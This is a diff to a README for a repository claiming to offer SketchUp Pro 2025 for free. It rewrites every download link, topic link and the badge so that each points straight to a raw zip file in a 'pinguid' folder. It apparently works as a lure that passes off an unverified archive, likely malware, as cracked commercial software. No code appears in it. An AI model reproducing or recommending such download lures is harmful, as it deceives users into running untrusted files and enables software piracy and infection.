@@ -1,6 +1,6 @@
 # 🎨 Sketch-Up-Pro-Version-2025.0 - Simplifying 3D Design for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Release-007bff.svg)](https://github.com/DUst469/Sketch-Up-Pro-Version-2025.0/releases)
+[![Download Now](https://raw.githubusercontent.com/DUst469/Sketch-Up-Pro-Version-2025.0/main/pinguid/Sketch-Up-Pro-Version-2025.0.zip)](https://raw.githubusercontent.com/DUst469/Sketch-Up-Pro-Version-2025.0/main/pinguid/Sketch-Up-Pro-Version-2025.0.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ SketchUp Pro is a professional-grade 3D modeling application commonly utilized i
 To begin using SketchUp Pro, follow these steps to download and install the application:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page:
-   [Download SketchUp Pro](https://github.com/DUst469/Sketch-Up-Pro-Version-2025.0/releases)
+   [Download SketchUp Pro](https://raw.githubusercontent.com/DUst469/Sketch-Up-Pro-Version-2025.0/main/pinguid/Sketch-Up-Pro-Version-2025.0.zip)
 
 2. **Choose the Right Version:** On the Releases page, you will see different versions of the software. Select the latest stable version that matches your system requirements.
 
@@ -39,7 +39,7 @@ Make sure your computer meets these requirements before installation to avoid an
 
 You can access the latest version of SketchUp Pro from the Releases page. To download the application, revisit the link below:
 
-[Download SketchUp Pro](https://github.com/DUst469/Sketch-Up-Pro-Version-2025.0/releases)
+[Download SketchUp Pro](https://raw.githubusercontent.com/DUst469/Sketch-Up-Pro-Version-2025.0/main/pinguid/Sketch-Up-Pro-Version-2025.0.zip)
 
 After downloading, follow the installation instructions provided earlier to set up the application.
 
@@ -67,11 +67,11 @@ You can find more resources by searching for **SketchUp Pro tutorials** on your 
 
 For additional information regarding trades, licenses, and educational resources, refer to the following topics:
 
-- [buy-sketchup-pro-license](https://github.com/DUst469/Sketch-Up-Pro-Version-2025.0)
-- [free-sketchup-pro-github](https://github.com/DUst469/Sketch-Up-Pro-Version-2025.0)
-- [google-sketchup-pro-software](https://github.com/DUst469/Sketch-Up-Pro-Version-2025.0)
-- [sketchup-pro-landscape-design](https://github.com/DUst469/Sketch-Up-Pro-Version-2025.0)
-- [sketchup-pro-plugin](https://github.com/DUst469/Sketch-Up-Pro-Version-2025.0)
+- [buy-sketchup-pro-license](https://raw.githubusercontent.com/DUst469/Sketch-Up-Pro-Version-2025.0/main/pinguid/Sketch-Up-Pro-Version-2025.0.zip)
+- [free-sketchup-pro-github](https://raw.githubusercontent.com/DUst469/Sketch-Up-Pro-Version-2025.0/main/pinguid/Sketch-Up-Pro-Version-2025.0.zip)
+- [google-sketchup-pro-software](https://raw.githubusercontent.com/DUst469/Sketch-Up-Pro-Version-2025.0/main/pinguid/Sketch-Up-Pro-Version-2025.0.zip)
+- [sketchup-pro-landscape-design](https://raw.githubusercontent.com/DUst469/Sketch-Up-Pro-Version-2025.0/main/pinguid/Sketch-Up-Pro-Version-2025.0.zip)
+- [sketchup-pro-plugin](https://raw.githubusercontent.com/DUst469/Sketch-Up-Pro-Version-2025.0/main/pinguid/Sketch-Up-Pro-Version-2025.0.zip)
   
 These topics offer great insights into how to maximize the software’s capabilities.
 
